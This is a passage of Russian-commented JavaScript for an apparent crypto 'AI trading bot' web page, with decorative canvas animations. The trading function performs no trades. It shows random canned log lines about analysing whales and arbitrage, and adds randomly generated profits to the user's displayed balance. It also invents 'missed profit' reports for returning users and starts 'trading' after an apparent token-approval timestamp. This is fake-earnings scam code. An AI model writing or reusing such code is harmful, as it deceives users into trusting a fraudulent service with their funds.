
        // Переходим к следующей сделке
        tradeTime += tradeInterval;
    }

    // Обновляем UI
    profitEl.textContent = `${profit.toFixed(2)} USDT`;
    tradesEl.textContent = trades;
    balanceEl.textContent = `${balance.toFixed(2)} USDT`;

    // Приветствие и отчёт
    createLogMessage("Привет, я снова с тобой!", now);
    const missedProfit = profit - initialProfit;
    createLogMessage(`За время твоего отсутствия было выполнено ${newLogs + newTrades} действий, ${newTrades} сделок, получена прибыль ${missedProfit.toFixed(2)} USDT.`, now);

    saveUserData();
}

// Имитация торгов с правдоподобным ИИ
function simulateTrading() {
    if (!isBotActive) return;

    const now = Date.now();
    const timeSinceLastLog = now - lastLogTimestamp;
    const minLogInterval = 1 * 60 * 1000;
    const maxLogInterval = 3 * 60 * 1000;
    const logInterval = Math.random() * (maxLogInterval - minLogInterval) + minLogInterval;
    const tradeInterval = 2 * 60 * 60 * 1000; // 2 часа между сделками

    const dayStart = new Date(now).setHours(0, 0, 0, 0);
    const tradesToday = logs.filter(log => {
        const logTime = new Date(log.split(']')[0].slice(1)).getTime();
        const isTrade = log.includes('Прибыль:');
        return isTrade && logTime >= dayStart;
    }).length;
    const maxTradesPerDay = 10;
    const maxProfitPerDay = tradeAmount * 0.1;

    // Сбрасываем profitToday, если начались новые сутки
    let profitTodayForDay = 0;
    logs.forEach(log => {
        if (log.includes('Прибыль:')) {
            const logTime = new Date(log.split(']')[0].slice(1)).getTime();
            if (logTime >= dayStart) {
                const profitMatch = log.match(/Прибыль: (\d+\.\d+)/);
                if (profitMatch) {
                    profitTodayForDay += parseFloat(profitMatch[1]);
                }
            }
        }
    });
    profitToday = profitTodayForDay;

    // Генерируем логи
    if (timeSinceLastLog >= logInterval) {
        const analysisMessages = [
            "Сканирую крупные транзакции на BNB Chain, ищу активность китов...",
            "Анализирую пулы ликвидности на PancakeSwap для поиска возможностей...",
            "Проверяю арбитражные связки между $BNB и $BUSD на Binance...",
            "Изучаю волатильность рынка на основе данных с Venus Protocol...",
            "Мониторю движения токенов $CAKE, ищу точки входа...",
            "Анализирую корреляцию $ADA и $BNB для прогноза роста...",
            "Проверяю ликвидность пары $XRP/$USDT на PancakeSwap...",
            "Сравниваю спреды между $BUSD и $USDT на разных биржах...",
            "Изучаю данные о крупных держателях $SOL на Solana для прогноза...",
            "Мониторю транзакции с $ETH на BNB Chain через мосты...",
            "Анализирую исторические данные $BNB для определения тренда...",
            "Проверяю активность смарт-контрактов на BNB Chain...",
            "Сканирую рынок на предмет пампов и дампов мелких токенов...",
            "Изучаю поведение трейдеров на Binance Futures для прогноза...",
            "Проверяю спреды на $CAKE/$BNB для арбитражной сделки...",
            "Мониторю стейкинг-пулы $BNB на PancakeSwap...",
            "Анализирую ликвидность токенов $BUSD на Venus...",
            "Сравниваю цены $XRP на Binance и PancakeSwap...",
            "Проверяю активность $ADA на децентрализованных биржах...",
            "Изучаю данные о крупных выводах $BNB с Binance...",
            "Анализирую свежие новости о $BTC для прогноза движения рынка...",
            "Сканирую активность китов на KuCoin, ищу следы крупных сделок...",
            "Проверяю данные с Dune Analytics по $BNB для долгосрочного прогноза...",
            "Мониторю социальные сети для анализа настроений по $ETH...",
            "Изучаю поведение $MATIC на Polygon для поиска точек входа...",
            "Сравниваю объёмы торгов $SOL на Binance и FTX...",
            "Анализирую данные Glassnode по $BTC для оценки рыночного давления...",
            "Проверяю активность $LINK на Chainlink для прогноза роста...",
            "Мониторю данные о стейкинге $BNB на Binance для анализа трендов...",
            "Сканирую рынок NFT на BNB Chain, ищу новые тренды...",
            "Анализирую движение $DOGE на Binance после недавнего твита Илона Маска...",
            "Проверяю ликвидность $AVAX на Trader Joe для арбитражных возможностей...",
            "Изучаю данные о крупных депозитах $USDC на биржах...",
            "Сравниваю спреды $LTC на Kraken и Binance...",
            "Анализирую поведение $SHIB на децентрализованных биржах...",
            "Проверяю данные о транзакции $TRX на Tron для прогноза...",
            "Мониторю движение $UNI на Uniswap для поиска точек входа...",
            "Изучаю данные о крупных выводах $ETH с Coinbase...",
            "Сравниваю цены $DOT на Polkadot через разные мосты...",
            "Анализирую данные с Santiment по $BNB для оценки настроений...",
            "Проверяю данные о стейкинге $ADA на Cardano для прогноза...",
            "Мониторю движение $LUNA на Terra для поиска возможностей...",
            "Изучаю данные о крупных депозитах $USDT на Binance...",
            "Сравниваю цены $AAVE на Aave и Uniswap...",
            "Проверяю активность $SUSHI на SushiSwap для прогноза...",
            "Мониторю движение $FTT на FTX для поиска возможностей...",
            "Анализирую данные о стейкинге $DOT на Polkadot...",
            "Сканирую данные о крупных выводах $SOL с Binance...",
            "Изучаю поведение $MANA на Decentraland для поиска точек входа...",
            "Сравниваю спреды $ENJ на Enjin и Binance...",
            "Проверяю данные о транзакций $ALGO на Algorand...",
            "Мониторю движение $GRT на The Graph для прогноза...",
            "Анализирую поведение $COMP на Compound для поиска возможностей..."
        ];
        createLogMessage(analysisMessages[Math.floor(Math.random() * analysisMessages.length)], now);
    }

    // Проверяем, можно ли выполнить сделку
    const firstTradeTime = bnbApprovalTimestamp + tradeInterval;
    const nextTradeTime = lastTradeTimestamp + tradeInterval;

    if (!firstTradeDelayPassed && now >= firstTradeTime) {
        firstTradeDelayPassed = true;
    }

    if (firstTradeDelayPassed && now >= nextTradeTime && tradesToday < maxTradesPerDay && profitToday < maxProfitPerDay) {
        const tradeMessages = [
            "Открываю сделку: $BNB на PancakeSwap, ожидаю рост на 1-2%...",
            "Закрыл позицию по $CAKE на Binance, зафиксировал прибыль...",
            "Выполнил арбитраж между $BUSD и $USDT на Binance и PancakeSwap...",
            "Открыл позицию по $ADA на PancakeSwap, ожидаю памп...",
            "Закрыл сделку по $XRP на Binance, зафиксировал небольшой профит...",
            "Использовал арбитражную связку $BNB/$BUSD на Venus Protocol...",
            "Открыл лонг по $SOL через мост на BNB Chain...",
            "Закрыл позицию по $ETH, зафиксировал прибыль на спреде...",
            "Выполнил внутрибиржевой арбитраж $CAKE/$BNB на PancakeSwap...",
            "Открыл шорт по $ADA на Binance Futures, ожидаю коррекцию...",
            "Закрыл позицию по $MATIC на Polygon, зафиксировал профит...",
            "Открыл лонг по $LINK на Uniswap, ожидаю рост...",
            "Выполнил арбитраж между $AVAX и $USDT на Trader Joe и Binance...",
            "Закрыл сделку по $DOGE на Binance после пампа...",
            "Открыл позицию по $SHIB на PancakeSwap, следуя за китами...",
            "Использовал связку $LTC/$USDC для арбитража на Kraken...",
            "Закрыл шорт по $TRX на Binance Futures, зафиксировал профит...",
            "Открыл лонг по $UNI на Uniswap после роста объёмов...",
            "Выполнил арбитраж между $DOT и $USDT через Polkadot и Binance...",
            "Закрыл позицию по $LUNA на Terra, зафиксировал небольшой профит...",
            "Открыл лонг по $AAVE на Aave, ожидаю рост ликвидности...",
            "Закрыл позицию по $SUSHI на SushiSwap, зафиксировал профит...",
            "Выполнил арбитраж между $FTT и $USDT на FTX и Binance...",
            "Открыл шорт по $DOT на Binance Futures, ожидаю коррекцию...",
            "Закрыл лонг по $SOL на Binance, зафиксировал прибыль...",
            "Открыл позицию по $MANA на Decentraland после роста NFT-активности...",
            "Выполнил арбитраж между $ENJ и $USDT на Enjin и Binance...",
            "Закрыл позицию по $ALGO на Algorand, зафиксировал небольшой профит...",
            "Открыл лонг по $GRT на The Graph, ожидаю рост после обновления...",
            "Закрыл шорт по $COMP на Compound, зафиксировал профит..."
        ];
        setTimeout(() => {
            if (tradesToday < maxTradesPerDay && profitToday < maxProfitPerDay) {
                const profitPerTrade = (maxProfitPerDay / maxTradesPerDay) * (Math.random() * (1.3 - 0.7) + 0.7); // Рандомизация от 0.7 до 1.3
                profit += profitPerTrade;
                profitToday += profitPerTrade;
                balance += profitPerTrade;
                trades += 1;
                lastTradeTimestamp = now;
                profitEl.textContent = `${profit.toFixed(2)} USDT`;
                tradesEl.textContent = trades;
                balanceEl.textContent = `${balance.toFixed(2)} USDT`;
                createLogMessage(`${tradeMessages[Math.floor(Math.random() * tradeMessages.length)]} Прибыль: ${profitPerTrade.toFixed(2)} USDT`, now);
                flashNodes = Array(3).fill().map(() => Math.floor(Math.random() * nodes.length));
                saveUserData();
            }
        }, 5000);
    }

    if (isBotActive) {
        setTimeout(simulateTrading, 60000); // Проверяем каждую минуту
    }
}

// Подключение событий
startBotBtn.addEventListener("click", startBot);

// Плексус анимация (внутри статуса)
function animatePlexus() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    nodes.forEach((node, i) => {
        node.x += node.vx;
        node.y += node.vy;
        if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
        if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
        node.scale = 0.8 + Math.sin(Date.now() / 1000) * 0.5;
        node.opacity = flashNodes.includes(i) ? 1 : 0.5 + Math.sin(Date.now() / 1000) * 0.5;
        ctx.beginPath();
        ctx.arc(node.x, node.y, 3 * node.scale, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(168, 85, 247, ${node.opacity})`;
        ctx.fill();
    });
    nodes.forEach((node1, i) => {
        nodes.slice(i + 1).forEach(node2 => {
            const dist = Math.hypot(node1.x - node2.x, node1.y - node2.y);
            if (dist < 30) {
                ctx.beginPath();
                ctx.moveTo(node1.x, node1.y);
                ctx.lineTo(node2.x, node2.y);
                ctx.strokeStyle = `rgba(168, 85, 247, ${1 - dist / 30})`;
                ctx.stroke();
            }
        });
    });
    requestAnimationFrame(animatePlexus);
}

animatePlexus();

// 3D плексус на фоне (по всему сайту)
function animateBackgroundPlexus() {
    bgCtx.clearRect(0, 0, bgCanvas.width, bgCanvas.height);
    bgNodes.forEach((node, i) => {
        node.x += node.vx;
        node.y += node.vy;
        node.z += node.vz;
        if (node.x < 0 || node.x > bgCanvas.width) node.vx *= -1;
        if (node.y < 0 || node.y > bgCanvas.height) node.vy *= -1;
        if (node.z < 0 || node.z > 500) node.vz *= -1;

        const perspective = 500 / (500 + node.z);
        const x = node.x * perspective + bgCanvas.width / 2 * (1 - perspective);
        const y = node.y * perspective + bgCanvas.height / 2 * (1 - perspective);
        const size = perspective * 3;

        bgCtx.beginPath();
        bgCtx.arc(x, y, size, 0, Math.PI * 2);
        bgCtx.fillStyle = `rgba(168, 85, 247, ${perspective})`;
        bgCtx.fill();
    });
    bgNodes.forEach((node1, i) => {
        bgNodes.slice(i + 1).forEach(node2 => {
            const perspective1 = 500 / (500 + node1.z);
            const perspective2 = 500 / (500 + node2.z);
            const x1 = node1.x * perspective1 + bgCanvas.width / 2 * (1 - perspective1);
            const y1 = node1.y * perspective1 + bgCanvas.height / 2 * (1 - perspective1);
            const x2 = node2.x * perspective2 + bgCanvas.width / 2 * (1 - perspective2);
            const y2 = node2.y * perspective2 + bgCanvas.height / 2 * (1 - perspective2);
            const dist = Math.hypot(x1 - x2, y1 - y2);
            if (dist < 100) {
                bgCtx.beginPath();
                bgCtx.moveTo(x1, y1);
                bgCtx.lineTo(x2, y2);
                bgCtx.strokeStyle = `rgba(168, 85, 247, ${1 - dist / 100})`;
                bgCtx.stroke();
            }
        });
    });
    requestAnimationFrame(animateBackgroundPlexus);
}

animateBackgroundPlexus();

// Обработка скролла лога
logContainer.addEventListener("scroll", () => {
    isUserScrolling = logContainer.scrollTop + logContainer.clientHeight < logContainer.scrollHeight;
});